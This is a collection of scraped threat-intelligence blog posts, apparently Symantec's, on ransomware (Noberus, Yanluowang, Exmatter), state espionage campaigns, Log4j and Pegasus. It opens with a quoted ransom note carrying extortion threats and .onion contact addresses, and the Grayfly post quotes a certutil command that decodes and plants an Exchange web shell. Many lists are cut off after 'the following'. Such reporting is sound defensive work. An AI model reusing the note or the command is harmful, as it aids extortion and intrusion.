text file tells victims the following: Important files on your system was ENCRYPTED and now they have \"sykffle\" extension. In order to recover your files you need to follow instructions below. Sensitive data on your system was DOWNLOADED and it will be PUBLISHED if you refuse to cooperate. - Employees personal data, CVs, DL, SSN. - Complete network map including credentials for local and remote services. - Financial information including clients’ data, bills, budgets, annual reports, bank statements. - Complete datagrams/schemas/drawings for manufacturing in solidworks format Private preview is published here: http://zujgzbu5y64xbmvc42addp4lxkoosb4tslf5mehnh7pvqjpwxn5gokyd[.]onion/[REDACTED] DO NOT MODIFY FILES YOURSELF. DO NOT USE THIRD PARTY SOFTWARE TO RESTORE YOUR DATA. YOU MAY DAMAGE YOUR FILES, IT WILL RESULT IN PERMANENT DATA LOSS. YOUR DATA IS STRONGLY ENCRYPTED, YOU CAN NOT DECRYPT IT WITHOUT CIPHER KEY. >> Recovery procedure Follow these simple steps to get in touch and recover your data: 1) Download and install Tor Browser from: https://torproject.org/ 2) Navigate to: http://mu75ltv3lxd24dbyu6gtvmnwybecigs5auki7fces437xvvflzva2nqd[.]onion/?access-key=[REDACTED] This is a sophisticated new ransomware with no apparent weaknesses in its encryption process, meaning unless victims have comprehensive backups they will be obliged to pay the ransom to recover their files. The fact it is written in Rust is interesting, as while Rust is not typically seen being used by malware developers, it is growing in popularity and it shows that ransomware developers too are not afraid to innovate in this area. While the reported number of victims of this ransomware so far appears to be small, the sophistication of Noberus itself and the level of determination shown by the attackers in the attack we did observe indicates it is likely we will see more of this ransomware in the future. It is also reported that the developers behind this ransomware are actively seeking affiliates on Russian-speaking hacking forums, meaning the number of malicious actors deploying this ransomware is likely to grow.

    "text": "Attackers most likely linked to Iran have attacked a string of telecoms operators in the Middle East and Asia over the past six months, in addition to a number of IT services organizations and a utility company. Organizations in Israel, Jordan, Kuwait, Saudi Arabia, the United Arab Emirates, Pakistan, Thailand, and Laos were targeted in the campaign, which appears to have made no use of custom malware and instead relied on a mixture of legitimate tools, publicly available malware, and living-off-the-land tactics. While the identity of the attackers remains unconfirmed, there is some evidence to suggest a link to the Iranian Seedworm (aka MuddyWater) group. The targeting and tactics are consistent with Iranian-sponsored actors. After breaching a targeted network, the attackers typically attempt to steal credentials and move laterally across the network. They appear to be particularly interested in Exchange Servers, deploying web shells onto them. In some cases, the attackers may be using compromised organizations as stepping stones to additional victims. Furthermore, some targets may have been compromised solely to perform supply-chain-type attacks on other organizations. In most attacks, the infection vector is unknown. Evidence of a possible vector was found at only one target. A suspected ScreenConnect setup MSI appeared to have been delivered in a zipped file named “Special discount program.zip”, suggesting that it arrived in a spear-phishing email. In one attack against a telecoms firm in the Middle East, which began in August 2021, the first evidence of compromise was the creation of a service to launch an unknown Windows Script File (WSF). Scripts were then used to issue various domain, user discovery, and remote service discovery commands. The attackers used PowerShell to download another WSF and run it. Net group was used to query for the “exchange trusted subsystem” domain group. The attackers used Certutil to download a suspected Ligolo tunneling tool and launch WMI, which was used to get remote machines to carry out the following tasks: Based on process lineage data, attackers seemed to use scripts extensively. These may be automated scripts used for collecting information and downloading additional tools. However, in one instance, a command asks cURL for help, suggesting that there may have been at least some hands-on-keyboard activity on the part of the attackers. The attackers then used a remote access tool, believed to be eHorus, to perform the following tasks: One feature of this attack against a telecoms organization is that the attackers may have attempted to pivot to other targets by connecting to the Exchange Web Services (EWS) of other organizations, another telecoms operator, and an electronic equipment company in the same region. The following commands were used: It is unclear what the intent of these requests is. It is possible the attackers were attempting to check connectivity to these organizations. One target that appeared to be an outlier was a utility company in Laos. The infection vector may have been the exploit of a public-facing service since the first machine that appeared to be compromised was an IIS web server. Suspicious activity also had w3wp.exe in the process lineage. The attackers then used PowerShell to: The attackers then used PowerShell to connect to a webmail server of an organization in Thailand. They also attempted to connect to IT-related servers belonging to another company in Thailand. To facilitate credential theft, WMI was used to execute PowerShell to modify the registry to store passwords in plaintext in memory. In addition to this, an obfuscated version of the publicly available CrackMapExec tool appeared to be deployed. The attackers made heavy use of legitimate tools and publicly available hacking tools. These include: There is some evidence to suggest that the Iranian Seedworm group was responsible for these attacks. Two IP addresses used in this campaign have been previously linked to Seedworm activity. However, Seedworm is known to regularly switch its infrastructure, meaning conclusive attribution cannot be made. There is also some overlap in tools between this campaign and earlier Seedworm campaigns. ScreenConnect, RemoteUtilities, SharpChisel, Ligolo, ProcDump, and Password Dumper were all referenced by Trend Micro in aMarch 2021 blog on Seedworm activity. In the case of two tools – SharpChisel and Password Dumper – identical versions were used in this campaign to those that were documented by Trend. If these attacks are linked to Iran, it will not be the first time an Iranian threat actor has targeted the telecoms sector. In 2018, Symantec revealedthat the Chafer group had compromised of a major telecoms services provider in the Middle East. While the ultimate end goal of the campaign remains unknown, the focus on telecoms operators suggests that the attackers are gathering intelligence on the sector and possibly attempting to pivot into spying on communications.

    "text": "UPDATE December 20, 2021:The Apache Software Foundation has released a patch for a third vulnerability in Log4j. Version 2.17.0 of the software was released on December 17 after issues were discovered with the previous release (2.16). Apache said that 2.16 does not always protect from infinite recursion in lookup evaluation and is vulnerable to CVE-2021-45105, a denial of service vulnerability. UPDATE December 15, 2021:Apache has patched a second vulnerability in Log4j. The vulnerability (CVE-2021-45046) arises from the fact that the fix for the previous vulnerability (CVE-2021-44228) did not completely prevent exploits in all circumstances. According to Apache, the vulnerability occurs in certain non-default configurations. It could permit attackers to “craft malicious input data using a JNDI Lookup pattern resulting in a denial of service (DOS) attack”. A zero-day vulnerability (CVE-2021-44228) has been discovered in Apache Log4j which, if exploited, could permit a remote attacker to execute arbitrary code on vulnerable systems. Exploit code for this vulnerability, dubbed Log4Shell, has been shared publicly and multiple attackers are already attempting to exploit it. Q: Will Symantec protect against exploit attempts? A:Yes, Symantec products will guard against exploit attempts and payloads with the following detections: Machine learning-based Symantec Data Center Securityprovides a range of protection for server workloads against this vulnerability: Q: What is the significance of this vulnerability? A:Apache Log4j is a java-based logging utility. It is widely used in cloud and enterprise software services. The fact that an exploit was discovered prior to the creation of a patch only heightens the severity of the threat. Q: Has the vulnerability been patched? A:Yes, users areadvised to update to version 2.15.0 immediately. Apache has also provided mitigation advice for users of earlier versions. Q: Is this vulnerability being exploited in the wild? A:Yes. Exploit code is publicly available and there are multiple reports of exploit attempts. To date, activity appears to be mainly centered on coin mining botnets but it is only a matter of time before attackers of all types attempt to leverage this exploit.

    "text": "Yanluowang, the ransomware recentlydiscovered by Symantec, a division ofBroadcom Software, is now being used by a threat actor that has been mounting targeted attacks against U. S. corporations since at least August 2021. The attacker uses a number of tools, tactics, and procedures (TTPs) that were previously linked to Thieflock ransomware attacks, suggesting that they may have been a Thieflock affiliate who shifted allegiances to the new Yanluowang ransomware family. The attackers have been heavily focused on organizations in the financial sector but have also targeted companies in the manufacturing, IT services, consultancy, and engineering sectors. In most cases, PowerShell is used to download tools to compromised systems including BazarLoader to assist in reconnaissance. The attackers then enable RDP via registry to enable remote access. After gaining initial access, the attackers usually deploy ConnectWise (formerly known as ScreenConnect), a legitimate remote access tool. In order to perform lateral movement and identify systems of interest, such as the victim’s Active Directory server, the attackers deploy Adfind, a free tool that can be used to query Active Directory, and SoftPerfect Network Scanner (netscan.exe), a publicly available tool used for discovery of hostnames and network services. The next phase of the attack is credential theft and the attackers use a wide range of credential-stealing tools, including: Along with these tools, the attackers also use a number of open-source tools such as KeeThief, a PowerShell script to copy the master key from KeePass. In some cases, customized versions of open-source credential-dumping tools were also observed (secretsdump.exe). Credentials were also dumped from the registry. In addition, the attackers have also used a number of other data capture tools, including a screen capture tool and a file exfiltration tool (filegrab.exe). Cobalt Strike Beacon was also deployed against at least one targeted organization. Other tools used include ProxifierPE, which can be used to proxy connections back to attacker-controlled infrastructure, and the free, Chromium-based Cent web browser. There is a tentative link between these Yanluowang attacks and older attacks involving Thieflock, ransomware-as-a-service developed by the Canthroid (aka Fivehands) group. Several TTPs used by these attackers overlap with TTPs used in Thieflock attacks, including: This link begs the question of whether Yanluowang was developed by Canthroid. However, analysis of Yanluowang and Thieflock does not provide any evidence of shared authorship. Instead, the most likely hypothesis is that these Yanluowang attacks may be carried out by a former Thieflock affiliate.

    "text": "At least one affiliate of the BlackMatter ransomware operation has begun using a custom data exfiltration tool in its attacks. Exmatter, which was discovered by Symantec’s Threat Hunter Team, is designed to steal specific file types from a number of selected directories and upload them to an attacker-controlled server prior to deployment of the ransomware itself on the victim’s network. This is the third time a custom data exfiltration tool appears to have been developed by ransomware operators, following the earlier discovery of the Ryuk Stealer tool and StealBit, which is linked to the LockBit ransomware operation. Exmatter is compiled as a . NET executable and obfuscated. When run, it checks its command line arguments for the following strings: \"nownd\" and \"-nownd\". If either is found, it attempts to hide its own window by calling the \"ShowWindow\" API as follows: In order to identify files for exfiltration, it will retrieve the drive names of all logical drives on the infected computer and collect all file path names, disregarding anything under the following directories: It will also exclude files of less than 1,024 bytes in size and files with the following attributes: It will only exfiltrate files with the following extensions: It attempts to prioritize files for exfiltration by using LastWriteTime. Files that match the criteria are then uploaded to a remote SFTP server using the following parameters: Exmatter also includes SOCKS5 configuration, but this is not used: When it has finished exfiltrating data, Exmatter starts the following process to remove any trace of itself: This will attempt to overwrite an initial chunk of the file before deleting it. Multiple variants of Exmatter have been found, suggesting that the attackers have continued to refine the tool in order to expedite exfiltration of a sufficient volume of high value data in as short a time as possible. In a second variant, the directory “C:\\Program Files\\Windows Defender Advanced Threat Protection\\Classification\\Configuration” has been replaced with “C:\\Program Files\\Windows Defender Advanced Threat Protection\" on the exclusion list. The file types “.xlsm”, and “.zip” were added to the inclusion list. A third version of note added a WebDav client. The code structure suggests that SFTP remains the first choice protocol, with WebDav acting as a backup. The WebDav client uses the following URL: The following file types were also added to the inclusion list: In addition to this, Exmatter is configured to skip exfiltration for files with names containing any of the following strings: A fourth variant contained updated SFTP server details: The WebDav client used the following updated URL: Finally, the list of files for inclusion was updated by removing “.png”. BlackMatter is linked to the Coreid cyber crime group, which was previously responsible for the Darkside ransomware. For the past 12 months, it has been one of the most prolific targeted ransomware operators and its tools have been used in a number of ambitious attacks, most notably the May 2021 Darkside attack on Colonial Pipeline that disrupted fuel supplies to the East Coast of the U. S. Coreid operates under a RaaS model, working with affiliates to conduct ransomware attacks and then taking a share of the profits. Like most ransomware actors, attacks linked to Coreid steal victims’ data and the group then threatens to publish it to further pressure victims into paying the ransom demand. Whether Exmatter is the creation of Coreid itself or one of its affiliates remains to be seen, but its development suggests that data theft and extortion continues to be a core focus of the group.

    "text": "Up to 100 organizations in Brazil have been targeted with a banking Trojan since approximately late August 2021, with the most recent activity seen in early October. This campaign appears to be a continuation of activity thatwas published about by researchers at ESET in 2020. The attackers appeared to be undeterred by exposure and Symantec, a division of Broadcom Software, has found a large number of new indicators of compromise (IOCs) relating to this latest wave of attacks. Symantec’s Threat Hunter Team first became aware of this recent campaign when suspicious activity was spotted in a customer environment on September 30, 2021. This initial suspicious activity was detected by our Cloud Analytics technology, and further investigation found that attempts were being made to download a suspicious file named mpr.dll onto the customer’s environment. Msiexec.exe was attempting to download the file from a suspicious URL. Further analysis indicated that five files were downloaded, four of which were signed and appeared to be legitimate DLL files, but the file named mpr.dll was not signed and was suspiciously large for a single DLL file at 588 MB. Symantec researchers concluded that this was a “Latin American banking Trojan”, due to the similar characteristics and file names seen in this campaign and in the research into Latin American banking Trojans published by ESET in 2020. Further investigation by our analysts revealed similar activity had been aimed at multiple different organizations since late August 2021. In fact, as many as 98 organizations may have been targeted with similar activity, with all affected organizations based in Brazil. The sectors targeted with this activity included information technology, professional services, manufacturing, financial services, and government. Banking Trojans are a type of malware designed to steal victims’ online banking information so malicious actors can access victims’ bank accounts. Once on a machine, the malware typically works by monitoring the websites victims are visiting and comparing these to a hardcoded list. If the victim visits a banking website the Trojan will generally display a spoofed login page in a pop-up over the legitimate page in an attempt to harvest victims’ banking credentials. These pop-ups are generally made to imitate the specific banks’ legitimate login pages and are often quite convincing. While once one of the biggest threats on the cyber-crime landscape, banking Trojans have been usurped in many parts of the world by ransomware in recent times. However, in Latin America particularly they still dominate a lot of cyber-crime activity. In its 2020 report, ESET determined that there were 11 banking Trojan gangs operating in Latin America, and that these groups cooperated with each other. It came to this conclusion due to the many shared tactics, tools, and procedures used by the cyber criminals deploying banking Trojans in Latin America. We did not observe what the initial infection vector was in this campaign, but it was likely a malicious URL spread via either spam email campaigns or through malvertising, which is typically the first step in Latin American banking Trojan campaigns. Victims are then directed to one of the following malicious URLs: Victims are then redirected to an Amazon Web Services (AWS) URL, which it appears the attackers abused to use as a command-and-control (C&C) server. A ZIP file that contains a Microsoft Software Installer (MSI) file is downloaded from the AWS infrastructure. ESET reported that most gangs deploying banking Trojans in Latin America had started using MSI files as an initial download in 2019. An MSI file can be used to install, uninstall, and update applications running on Windows systems. If the victim double-clicks the MSI file inside the downloaded ZIP, it will execute msiexec.exe, which then connects to a secondary C&C server to download another ZIP file containing the payload (mpr.dll), along with other legitimate portable executable (PE) files. The URLs observed being accessed by msiexec.exe included: The extracted ZIP file contains a renamed legitimate Oracle application - VBoxTray.exe. This is executed to load the payload (mpr.dll) by way of DLL search-order hijacking. DLL search-order hijacking takes advantage of how Windows handles DLLs to allow an attacker to load malicious code into a legitimate process. The mpr.dll file is also bigger than 100 MB in order to evade submission to security services, which tend not to process files above that size. Both of these files and this exact same process were observed in the banking Trojan activity detailed in ESET’s report. Persistence is then created for the renamed VBoxTray.exe so that mpr.dll is always side-loaded into it by way of either Windows Registry or Windows Management Instrumentation (WMI). This is another common technique used in the attack chain for Latin American banking Trojans. The various steps taken by the attackers behind this activity to evade detection - such as using a large file for the payload so that it won’t be scanned by security software, and leveraging legitimate processes and applications for malicious purposes - show that those behind this attack campaign are reasonably sophisticated actors. The number of organizations affected in this campaign also indicates that a large number of people are likely responsible for this activity - and it may be that more than one group is behind this activity. It could be a number of groups acting in a cooperative manner, as ESET said may be the approach taken by the various banking Trojan attack groups operating in Latin America. While ransomware dominates much of the discussion on the cyber-crime landscape at the moment, it is important to remember it is not the only threat out there. Banking Trojans have the potential to be a costly problem for individuals and organizations, so people, especially those based in Latin America where this activity appears to be particularly prevalent, need to remain alert to this threat. Simple steps, like ensuring you have multi-factor authentication enabled on all financial accounts, can help lessen the impact of threats like these.

    "text": "An espionage campaign using a previously undocumented toolset has targeted a range of organizations in South East Asia. Among the identified targets are organizations in the defense, healthcare, and information and communications technology (ICT) sectors. The campaign appears to have begun in September 2020 and ran at least until May 2021. The toolset used by the attackers includes loaders, a modular backdoor, a keylogger, and an exfiltration tool designed to abuse cloud storage service Dropbox. The initial infection vector employed by the attackers remains unknown. The earliest sign of attempted compromise is a loader that decrypts and loads a payload from a .dat file. At least two different file names have been observed for the .dat file: sdc-integrity.dat and scs-integrity.dat. The loader also calls the DumpAnalyze export from the decrypted payload. The payload has yet to be identified but is almost certainly a modular backdoor. This can be inferred from one of the modules identified. This \"Orchestrator\" module points to the existence of a separate DLL module that exposes at least 16 functions, as well as the existence of a custom binary command and control (C&C) protocol used by Orchestrator but implemented separately. This module appears to be a core component of the backdoor. It runs as a Windows service and a large part of its functionality is implemented in a separate DLL that is loaded from registry (located in HKEY_CLASSES_ROOT\\.z\\OpenWithProgidsEx\\<value_name_resolved_at_runtime>). The module is expected to export the following functions: The module loads a configuration either from a file (CSIDL_COMMON_APPDATA\\Microsoft\\Crypto\\RSA\\Keys.dat) or from the registry (HKEY_CLASSES_ROOT\\.z\\OpenWithProgidsEx\\CONFIG). The configuration is encrypted. The module uses the function Decrypt_ByteToByte from the separate DLL to decrypt the configuration. The configuration is expected to contain the following options (stored in XML format): The module also uses the hardcoded mutex name, Global\\QVomit4. Other tools used in the campaign include a keylogger, which shows signs of being authored by the same developer, sharing unique strings with other tools and string obfuscation techniques. The attackers also used 7zr, a legitimate tool that is a lightweight version of the 7-Zip archiver, in addition to a data-exfiltration tool that sends stolen data to Dropbox. The nature of the targets and the tools used have all the hallmarks of an espionage operation. Symantec has yet to attribute the attacks to a known actor and it appears that the attackers took some steps to complicate attribution. For example, it is not clear what language the group speaks and samples of the backdoor module found contained strings in what appeared to be both Cyrillic and Urdu scripts. The only potential clue found to date is that one of the organizations attacked was also targeted by a tool used by the China-linked Leafhopper group (aka APT30) during the same time period. However, there is no evidence as yet to tie the tool to this campaign. For the latest protection updates, please visit theSymantec Protection Bulletin.

    "text": "A previously unseen actor, likely nation-state-backed, is targeting organizations in South Asia, with a focus on Afghanistan, in what appears to be an information-stealing campaign using a new toolset. The Harvester group uses both custom malware and publicly available tools in its attacks, which began in June 2021, with the most recent activity seen in October 2021. Sectors targeted include telecommunications, government, and information technology (IT). The capabilities of the tools, their custom development, and the victims targeted, all suggest that Harvester is a nation-state-backed actor. The most notable thing about this campaign is the previously unseen toolset deployed by the attackers. The attackers deployed a custom backdoor called Backdoor. Graphon on victim machines alongside other downloaders and screenshot tools that provided the attackers with remote access and allowed them to spy on user activities and exfiltrate information. We do not know the initial infection vector that Harvester used to compromise victim networks, but the first evidence we found of Harvester activity on victim machines was a malicious URL. The group then started to deploy various tools, including its custom Graphon backdoor, to gain remote access to the network. The group also tried to blend its activity in with legitimate network traffic by leveraging legitimate CloudFront and Microsoft infrastructure for its command and control (C&C) activity. The custom downloader used by the attackers leverages the Costura Assembly Loader. Once on a victim machine, it checks if the following file exists: If the file does not exist it downloads a copy from the following URL: Next, the sample creates the following file if it does not exist: Then it sets the following registry value to create a loadpoint: Finally it opens an embedded web browser within its own UI using the following URL: While it initially appeared that this URL may have been a loadpoint for Backdoor. Graphon, upon further investigation it appears to be a decoy to confuse any affected users. Backdoor. Graphon is compiled as a . NET PE DLL with export “Main” and the following PDB file name: When this is executed, it attempts to communicate with the attackers’ C&C servers, which are hosted on Microsoft infrastructure. The attackers then run commands to control their input stream and capture the output and error streams. They also periodically send GET requests to the C&C server, with the content of any returned messages extracted and then deleted. Data that cmd.exe pulled from the output and error streams is encrypted and sent back to the attackers’ servers. The custom screenshot tool was also packed with the Costura Assembly Loader. The screenshot tool takes photos that it saves to a password-protected ZIP archive for exfiltration, with all archives older than a week deleted. While we do not have enough evidence yet to attribute Harvester’s activity to a specific nation state, the group’s use of custom backdoors, the extensive steps taken to hide its malicious activity, and its targeting all point to it being a state-sponsored actor. Harvester’s use of legitimate infrastructure to host its C&C servers in order to blend in with normal network traffic is one example of the stealthy steps taken by this actor. The targeting of organizations in Afghanistan in this campaign is also interesting given the huge upheaval seen in that country recently. The activity carried out by Harvester makes it clear the purpose of this campaign is espionage, which is the typical motivation behind nation-state-backed activity. That Harvester’s most recent activity was seen earlier this month means that organizations in the sectors and geographies mentioned should be alert to the malicious activity outlined in this blog.

    "text": "The Symantec Threat Hunter Team, a part ofBroadcom Software, has uncovered what appears to be a new ransomware threat called Yanluowang that is being used in targeted attacks. In a recent attempted ransomware attack against a large organization, Symantec obtained a number of malicious files that, upon further investigation, revealed the threat to be a new, if somewhat underdeveloped, ransomware family. The Threat Hunter Team first spotted suspicious use of AdFind, a legitimate command-line Active Directory query tool, on the victim organization’s network. This tool is often abused by ransomware attackers as a reconnaissance tool, as well as to equip the attackers with the resources that they need for lateral movement via Active Directory. Just days after the suspicious AdFind activity was observed on the victim organization, the attackers attempted to deploy the Yanluowang ransomware. Before the ransomware is deployed on a compromised computer, a precursor tool carries out the following actions: The Yanluowang ransomware is then deployed and carries out the following actions: The ransom note dropped by Yanluowang warns victims not to contact law enforcement or ransomware negotiation firms. If the attackers’ rules are broken the ransomware operators say they will conduct distributed denial of service (DDoS) attacks against the victim, as well as make “calls to employees and business partners.” The criminals also threaten to repeat the attack “in a few weeks” and delete the victim’s data.

    "text": "For the last number of years, targeted ransomware has been one of the main cyber risks for businesses and other large organizations. However, as outlined in anew whitepaperfrom the Symantec Threat Hunter Team, a part ofBroadcom Software, the past twelve months have seen ransomware attackers become more aggressive, finding more ways to increase the reach of their attacks, and becoming more ambitious by mounting a number of audacious and highly disruptive attacks. The attack against Colonial Pipeline in the U. S. in May 2021 caused significant disruption and prompted concerns about the nation’s fuel supplies. In the same month, an attack on Ireland’s national health service, the Health Service Executive, forced it to cancel thousands of appointments and initiate a recovery operation that is only now concluding. While the overall levels of ransomware activity have fallen, this is accounted for by the decline of mass-mailing, indiscriminate ransomware attacks. Of greater concern is that the number of organizations confirmed as affected by targeted ransomware attacks increased by up by 83% over the past 18 months, from 81 in January 2020 to 148 in June 2021. The real number of targeted ransomware attacks is much higher. Confirmed attacks from known targeted ransomware families are probably only a representative sample of the overall number of attacks involving these threats. Many targeted ransomware attacks are halted before payload deployment, meaning they may not be identified as ransomware. In addition, most targeted ransomware operators recompile their ransomware for every new attack. This means that the variant of the ransomware used in an attack may be blocked by generic or machine learning-generated detections rather than a detection linked to that ransomware family. Alongside this increase in activity levels, the ransomware threat landscape has become more complex and sophisticated and a number of new developments have compounded the threat for organizations. Although ransomware-as-a-service (RaaS) is not a new concept, the RaaS marketplace has evolved significantly over the past year. The basic template currently involves ransomware authors offering access to the ransomware itself, hosting for breached data, and handling of ransom negotiations. In some cases, it has been reported that ransomware developers provide an entire playbook for affiliates. However, some ransomware affiliates now appear to be becoming less reliant on ransomware authors. While affiliates have long been known to migrate to other ransomware developers if the developer they were working with shuts down, many are now using their own distinct tools, tactics, and procedures (TTPs) regardless of the payload they are deploying. Some affiliates now appear to be simultaneously collaborating with more than one ransomware author. Symantec Threat Hunter Team has observed affiliates using two different strains of ransomware in a very short space of time and, in some cases, during the same attack. Over the past 12 months, secondary infections, usually via botnets, have become one of the most prevalent means of access for ransomware groups. Trojans that were once used for financial fraud, such as Trickbot, have recently been repurposed mainly as distribution channels for other malware, most notably ransomware. In some cases, ransomware attackers already control the botnets, such as the Miner group (aka Wizard Spider), which owns the Trickbot botnet. Trickbot has been seen as a precursor to attacks by Ryuk, which is also attributed to Miner. Similarly, Hispid (aka Evil Corp) have leveraged their own Dridex botnet, which was originally built to mount financial attacks, to give them a means of delivering the ransomware to organizations. Other actors have since attempted to replicate this attack pattern, seeking collaborations with established botnet operators. The most notable of these is the use of IcedID by at least one affiliate operator of the Conti ransomware. The profusion of groups carrying out targeted ransomware attacks combined with the evolution of the RaaS marketplace now means that targeted ransomware poses a grave threat to organizations. Although ransomware gangs have attracted significant government and law enforcement attention in recent months, multi-million dollar ransom payments mean that most threat actors remain undeterred.

    "text": "The recent iOS 14.8 update fixes a zero-day, zero-click exploit for a vulnerability affecting every mobile iOS device. The flaw, dubbed FORCEDENTRY (CVE-2021-30860), resided in Apple’s iMessage and, according toa report by The Citizen Lab, was used to push NSO Group’s Pegasus spyware to mobile iOS devices dating back to as far as February 2021. Pegasus has been around for some years now but has been back in the spotlight recently following reports from both The Citizen Lab andAmnesty Internationalabout the spyware targeting journalists, activists, and others. One of the main concerns with FORCEDENTRY is that it can be used in what is called a zero-click attack, meaning it requires no user interaction. An attacker exploiting the flaw only needs the Apple ID of a device in order to silently compromise it This post will cover what is currently known about the Pegasus threat, how common it is, and how Symantec, a part ofBroadcom Software, is keeping its customers safe from the spyware. Developed by Israeli cyber arms firm NSO Group, Pegasus is a sophisticated and elusive mobile spyware that has been around for some years now. Pegasus has the ability to read messages, track calls, track device location, collect passwords, and access the target device's microphone and camera. According to NSO Group, Pegasus is sold to nation-states and law enforcement to help in the fight against crime and terrorism, and to maintain public safety. Despite this statement, misuse of the software has been flagged over the years and Symantec has had a long-standing capability to detect it. A recent reportuncovered attacks exploiting vulnerabilities in Apple's iMessage service in order to install Pegasus. The attack only needs the Apple ID - an email or phone number - to infect the targeted mobile device. The attack payload uses iMessage fields that are \"hidden\" from the user; in fact, if the iMessage text field is blank, no alerts or notifications are shown at all. This type of iMessage zero-click attack dates back to iOS 11 and research done by the Google Project Zero team. The payload exploits vulnerabilities in the iMessage framework, such as exploiting the PDF processor by sending a maliciously crafted PDF to achieve arbitrary code execution (fixed in the iOS 14.8 update). Further, the attack execution takes place entirely inside the iMessage framework’s sandbox processes and is wiped when the device restarts. Suffice to say, this makes measuring the scope of the Pegasus threat challenging. The best clue left behind by a FORCEDENTRY attack is the resulting web traffic it generates when it tries to download Pegasus spyware framework files. Reports from Amnesty International listed known Pegasus infection URLs. We ran that list against theSymantec WebPulseURL reputation service used by Symantec Endpoint Protection Mobile to identify and block suspect web traffic. We found close to 1 in 150,000 iOS devices attempting to access a known Pegasus infection URL. While this number might seem low, this is only one part of the kill chain and the list of known infection URLs is by no means exhaustive. In any case, Symantec WebPulse was able to identify the URLs as potential risks or malicious, and stop the infection and kill chain - even if it contained zero-day exploits and required zero user clicks - dead in its tracks. Symantec Endpoint Protection Mobile analyzes links contained within SMS messages, shielding users from attacks by checking URLs (even those that might be hidden to the user) against the threat intelligence in Symantec WebPulse, part of the Symantec Global Intelligence Network. Symantec Endpoint Protection Mobile provides protection against network content threats, filtering and blocking communication to known command-and-control servers used in Pegasus campaigns (the same WebPulse global URL intelligence information isembedded in both our Windows and Mac Symantec Endpoint Protection agents). It can also identify and protect vulnerable iOS & Android devices. For more details around coverage see the Pegasus SpywareProtection Bulletinfrom the Symantec Security Center. Patches for FORCEDENTRY are available formacOS,iOS, iPadOS, andwatchOS, and users are advised to apply these patches as soon as possible. Apple addressed the FORCEDENTRY vulnerability quickly with its iOS 14.8 update. However, with the iMessage framework increasingly a target for threat hunters, we expect many more fixes to come. We also expect the number of attacks targeting iOS devices will follow similar attack patterns used by Pegasus. Unfortunately, with limited visibility into the attack payload and kill chain, attackers know they can easily evade detection. All this highlights how important it is to have mobile endpoint protection as part of a layered network defense strategy to prevent known and unknown (zero-day) attacks targeting mobile devices. Kevin is a security researcher in Symantec's Modern OS Security (MOS) division. He's constantly researching new and innovative ways to automate discovery of threats impacting mobile users.

    "text": "Symantec, part ofBroadcom Software, has linked the recently discovered Sidewalk backdoor to the China-linked Grayfly espionage group. The malware, which is related to the older Crosswalk backdoor (Backdoor. Motnug) has been deployed in recent Grayfly campaigns against a number of organizations in Taiwan, Vietnam, the United States, and Mexico. A feature of this recent campaign was that a large number of targets were in the telecoms sector. The group also attacked organizations in the IT, media, and finance sectors. Sidewalk was recently documented by ESET, who attributed it to a new group it called SparklingGoblin, which it linked to the Winnti malware family. Symantec’s Threat Hunter Team has attributed Sidewalk to Grayfly, a longstanding Chinese espionage operation. Members of the groupwere indicted in the U. S. in 2020. The recent campaign involving Sidewalk suggests that Grayfly has been undeterred by the publicity surrounding the indictments. Grayfly (aka GREF and Wicked Panda) is a targeted attack group that has been active since at least March 2017 using a custom backdoor known as Backdoor. Motnug (aka TOMMYGUN/CROSSWALK), a custom loader called Trojan. Chattak, Cobalt Strike (aka Trojan. Agentemis), and ancillary tools in its attacks. Grayfly has been observed targeting a number of countries in Asia, Europe, and North America across a variety of industries, including food, financial, healthcare, hospitality, manufacturing, and telecommunications. In more recent activity, Grayfly has continued with its focus on telecommunications but has also been observed targeting organizations operating within the media, finance, and IT service provider sectors. Typically Grayfly targets publicly facing web servers to install web shells for initial intrusion, before spreading further within the network. Once a network has been compromised, Grayfly may install its custom backdoors onto additional systems. These tools allow the attackers to have comprehensive remote access to the network and proxy connections allowing them to access hard-to-reach segments of a target's network. Although sometimes labeled APT41, we consider Grayfly the espionage arm of APT41. Similarly, Symantec tracks other sub-groups of APT41 separately, such as Blackfly, its cyber-crime arm. A characteristic of the recent campaign was that the group appeared to be particularly interested in attacking exposed Microsoft Exchange or MySQL servers. This suggests that the initial vector may be the exploit of multiple vulnerabilities against public-facing servers. In at least one attack, the suspicious Exchange activity was followed by PowerShell commands used to install an unidentified web shell. Following this, the malicious backdoor was executed. After the installation of the backdoor, the attackers deployed a custom version of the credential-dumping tool Mimikatz. This version of Mimikatz has been used previously in Grayfly attacks. The first indication of attacker activity was identified at 20:39 local time, where a Base64-encoded PowerShell command was executed via a legitimate Exchange Server-related process. The command was used to execute certutil to decode and install a web shell: >(^_certutil -decode -f C:\\Windows\\Temp\\ImportContactList_-.aspx C:\\Windows\\Temp\\ImportContactList.aspx;if((dir C:\\Windows\\Temp\\ImportContactList.aspx). Length -eq 212){Remove-Item -Force C:\\Windows\\Temp\\ImportContactList_*-*.aspx}* Next, another Base64-encoded PowerShell command was executed. This command was used to move the web shell to the Exchange install path, accessible by the attackers – specifically the ClientAccess\\ecp directory. Several minutes later, a backdoor was executed via installutil.exe: Roughly an hour later, the attackers were observed executing a WMIC command in order to run a Windows batch file. This file was used to create a scheduled task to execute the backdoor and ensure persistence: Shortly after this, Mimikatz was executed to dump credentials: After this point, no further activity was observed. Three Chinese men were indicted in the U. S. in 2020 for their involvement in attacks that involved Grayfly tools and tactics. At the time of the indictment, Jiang Lizhi, Qian Chuan, and Fu Qiang were based in the Chinese city of Chengdu and held senior positions in a company called Chengdu 404. The company describes itself as a network security specialist and claims to employ a team of white hat hackers who can perform penetration testing along with other security operations. The indictment charged the men with involvement in attacks against over 100 different organizations in the U. S., South Korea, Japan, India, Taiwan, Hong Kong, Malaysia, Vietnam, India, Pakistan, Australia, the United Kingdom, Chile, Indonesia, Singapore, and Thailand. Jiang was said to have a “working relationship” with the Chinese Ministry of State Security which would provide him and his associates with a degree of state protection. Grayfly is a capable actor, likely to continue to pose a risk to organizations in Asia and Europe across a variety of industries, including telecommunications, finance, and media. It's likely this group will continue to develop and improve its custom tools to enhance evasion tactics along with using commodity tools such as publicly available exploits and web shells to assist in their attacks.

